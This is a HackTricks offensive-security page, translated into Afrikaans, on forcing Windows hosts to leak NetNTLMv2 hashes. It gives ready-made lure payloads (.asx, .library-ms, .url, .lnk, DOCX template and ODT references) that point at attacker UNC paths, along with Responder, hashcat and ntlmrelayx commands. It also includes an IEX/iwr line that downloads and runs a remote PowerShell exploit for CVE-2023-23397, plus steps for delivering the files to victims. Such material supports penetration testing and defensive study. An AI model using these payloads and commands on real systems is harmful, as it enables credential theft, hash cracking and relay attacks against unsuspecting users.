# Plekke om NTLM-creds te steel

{{#include ../../banners/hacktricks-training.md}}

**Kyk na al die goeie idees by [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), van die aflaai van ’n Microsoft Word-lêer aanlyn tot die NTLM-leak-bron: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md en [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Skryfbare SMB-share + Explorer-geaktiveerde UNC-lokmiddels (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

As jy **na ’n share kan skryf wat gebruikers of geskeduleerde take in Explorer blaai**, plaas lêers waarvan die metadata na jou UNC verwys (bv. `\\ATTACKER\share`). Die weergawe van die vouer aktiveer **implisiete SMB-authentisering** en leak ’n **NetNTLMv2** na jou listener.<sup>[[1]](#references)</sup>

1. **Genereer lokmiddels** (dek SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/ens.)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Plaas hulle op die skryfbare netwerkdeel** (enige vouer wat die slagoffer oopmaak):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Luister en kraak**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows kan verskeie lêers gelyktydig bereik; enigiets wat Explorer voorbeskou (`BROWSE TO FOLDER`), vereis geen klikke nie.

### Windows Media Player-snitlyste (.ASX/.WAX)

As jy ’n target kan kry om ’n Windows Media Player-snitlys wat jy beheer oop te maak of voor te beskou, kan jy Net‑NTLMv2 leak deur die inskrywing na ’n UNC-pad te laat wys. WMP sal probeer om die verwysde media oor SMB te haal en sal outomaties staaf.<sup>[[3]](#references)[[4]](#references)</sup>

Voorbeeld-payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Versamelings- en kraakvloei:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### .library-ms wat in ZIP ingebed is: NTLM leak (CVE-2025-24071/24055)

Windows Explorer hanteer .library-ms-lêers onveilig wanneer hulle direk vanuit ’n ZIP-argief oopgemaak word. As die biblioteekdefinisie na ’n afgeleë UNC-pad verwys (bv. \\attacker\share), veroorsaak dit dat Explorer die UNC-pad opnoem en NTLM-verifikasie aan die aanvaller stuur deur bloot die .library-ms-lêer binne die ZIP te bekyk of te begin. Dit lewer ’n NetNTLMv2 op wat vanlyn gekraak of moontlik afgelê kan word.<sup>[[2]](#references)</sup>

Minimale .library-ms wat na ’n aanvaller se UNC-pad verwys

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Operasionele stappe
- Skep die .library-ms-lêer met die XML hierbo (stel jou IP/hostnaam in).
- Zip dit (op Windows: Send to → Compressed (zipped) folder) en lewer die ZIP aan die teiken.
- Begin ’n NTLM-capture listener en wag totdat die slagoffer die .library-ms-lêer vanuit die ZIP oopmaak.


### Outlook-kalenderherinnering-klankpad (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook vir Windows het die uitgebreide MAPI-eienskap PidLidReminderFileParameter in kalenderitems verwerk. As daardie eienskap na ’n UNC-pad verwys (bv. \\attacker\share\alert.wav), sou Outlook die SMB-share kontak wanneer die herinnering afgaan, en die gebruiker se Net-NTLMv2 lek sonder enige klik. Dit is op 14 Maart 2023 reggestel, maar is steeds hoogs relevant vir ouer/onaangeraakte omgewings en vir historiese insidentreaksie.<sup>[[5]](#references)</sup>

Vinnige uitbuiting met PowerShell (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Luisterkant:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Notas
- ’n Slagoffer hoef Outlook for Windows net aan die gang te hê wanneer die herinnering geaktiveer word.
- Die leak lewer Net‑NTLMv2 op wat geskik is vir offline cracking of relay (nie pass-the-hash nie).


### .LNK/.URL-ikoongebaseerde zero‑click NTLM-leak (CVE‑2025‑50154 – bypass van CVE‑2025‑24054)

Windows Explorer vertoon shortcut-ikone outomaties. Onlangse navorsing het getoon dat dit selfs ná Microsoft se April 2025-patch vir UNC-ikoon-shortcuts steeds moontlik was om NTLM-verifikasie sonder enige klikke te aktiveer deur die shortcut-teiken op ’n UNC path te huisves en die ikoon plaaslik te hou (die patch-bypass is CVE‑2025‑50154 toegewys). Deur bloot die vouer te bekyk, laat Explorer metadata van die afgeleë teiken ophaal en NTLM na die aanvaller se SMB-bediener stuur.<sup>[[6]](#references)</sup>

Minimale Internet Shortcut-payload (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Skep Shortcut-payload (.lnk) via PowerShell:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Afleweringsidees
- Plaas die shortcut in ’n ZIP en kry die slagoffer om dit te blaai.
- Plaas die shortcut op ’n skryfbare share wat die slagoffer sal oopmaak.
- Kombineer dit met ander loklêers in dieselfde vouer sodat Explorer die items voorbeskou.

### .LNK NTLM-leak sonder klik via ExtraData-ikoonpad (CVE‑2026‑25185)

Windows laai `.lnk`-metadata tydens **aansig/voorskou** (ikoonweergawe), nie net tydens uitvoering nie. CVE‑2026‑25185 wys ’n ontledingspad waar **ExtraData**-blokke die shell laat om ’n ikoonpad op te los en die lêerstelsel **tydens laai** te raak, wat uitgaande NTLM-verkeer veroorsaak wanneer die pad afgeleë is.

Belangrike snellervereistes (waargeneem in `CShellLink::_LoadFromStream`):
- Sluit **DARWIN_PROPS** (`0xa0000006`) in ExtraData in (hek na die ikoonopdateringsroetine).
- Sluit **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) in, met **TargetUnicode** ingevul.
- Die laaier brei omgewingsveranderlikes in `TargetUnicode` uit en roep `PathFileExistsW` op die gevolglike pad.

As `TargetUnicode` na ’n UNC-pad verwys (bv. `\\attacker\share\icon.ico`), veroorsaak **net die aansig van ’n vouer** wat die shortcut bevat uitgaande verifikasie. Dieselfde laaipad kan ook deur **indeksering** en **AV-skandering** geaktiveer word, wat dit ’n praktiese lek-oppervlak sonder klik maak.<sup>[[7]](#references)</sup>

Navorsingsnutsgoed (ontleder/opwekker/UI) is beskikbaar in die **LnkMeMaybe**-projek om hierdie strukture te bou/inspekteer sonder om die Windows-GUI te gebruik.<sup>[[8]](#references)</sup>


### WebDAV-verifikasiedwinging / geldigheidskontrole van geloofsbriewe via `davclnt.dll,DavSetCookie`

Die oorspronklike **WebDAV-kliënt** kan misbruik word om die huidige aanmeldingsessie te dwing om by ’n arbitrêre **HTTP/WebDAV**-eindpunt te verifieer:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Waarom dit nuttig is:
- Teen ’n **aanvallerbeheerde WebDAV-bediener** kan dit **NTLM oor HTTP** aktiveer sonder om ’n pasgemaakte kliënt te laat aflaai.
- Teen **interne gashere** is dit ’n stil manier om te **valideer waar gesteelde geloofsbriewe aanvaar word** voordat jy lateraal beweeg.<sup>[[9]](#references)</sup>
- Die opdrag is ’n goeie alternatief wanneer **SMB-uitgaande verkeer gefiltreer word**, maar **HTTP/WebDAV** steeds bereikbaar is.

Operasionele notas:
- Die **WebClient**-diens moet op die bronmasjien loop.
- `rundll32.exe` laai `davclnt.dll` en laat Windows die WebDAV-verifikasie met die **huidige gebruiker se geloofsbriewe** hanteer.<sup>[[10]](#references)</sup>
- As jy dit na infrastruktuur wys wat jy beheer, gebruik ’n NTLM-bewuste HTTP-listener/relay soos:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Vanuit ’n opsporingsperspektief is herhaalde `rundll32.exe davclnt.dll,DavSetCookie`-uitvoerings teen baie interne stelsels ’n sterk aanduiding van **credential validation / spray-like lateral movement prep**, eerder as normale gebruikersgedrag.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) om NTLM af te dwing

Office-dokumente kan na ’n eksterne sjabloon verwys. As jy die aangehegte sjabloon op ’n UNC-pad stel, sal die dokument se opening SMB-verifikasie uitvoer.

Minimale DOCX-verhoudingsveranderinge (binne word/):

1) Wysig word/settings.xml en voeg die aangehegte sjabloonverwysing by:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Wysig word/_rels/settings.xml.rels en laat rId1337 na jou UNC verwys:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Pak dit weer as .docx en lewer dit af. Begin jou SMB-capture listener en wag totdat dit oopgemaak word.

### ODT-eksterne objek vir SMB-verifikasie

Wanneer ’n dokumentoplaaipad `.odt` aanvaar, maar die teiken nie Office `.docx`-lêers oopmaak nie, gebruik eerder ’n OpenDocument-eksterne objek as ’n Office-sjabloon. Metasploit se `auxiliary/fileformat/odt_badodt` genereer ’n ODT waarvan `content.xml` ’n `draw:object`-verwysing bevat wat by laai uitgevoer word, soos die een hieronder. Stel `LHOST` op die SMB-listener, laai die ODT op via die toegelate werkvloei, en vang die uitgaande NetNTLMv2-respons op wanneer ’n gebruiker of dokumentverwerker dit oopmaak. ’n Lêernaamuitbreidingskontrole inspekteer nie hierdie ingebedde URL nie; NTLM-beperkings op die teiken keer nie noodwendig uitgaande verifikasie nie.<sup>[[15]](#references)</sup>

```xml
<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

Vir idees ná die capture oor relaying of misbruik van NTLM, kyk na:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Lokmiddels met skryfbare shares + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 na DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS-junction na webroot RCE → FullPowers + GodPotato na SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM-kwesbaarhede: Ongepatchte bedreigings van privilege escalation by Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft versag Outlook EoP (CVE‑2023‑23397) en verduidelik die NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, one NTLM: Omseiling van Microsoft se security patch (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: ’n Oorsig van CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe-nutsgoed](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Wanneer IT Support bel: Ontleding van ’n ModeloRAT-veldtog van Teams tot domeinkompromittering](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h-opskrif](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV-versoek](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Interessante plekke om Netntlm-hashes te steel](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [15] [HTB: Hercules — ODT external-object NTLM capture](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
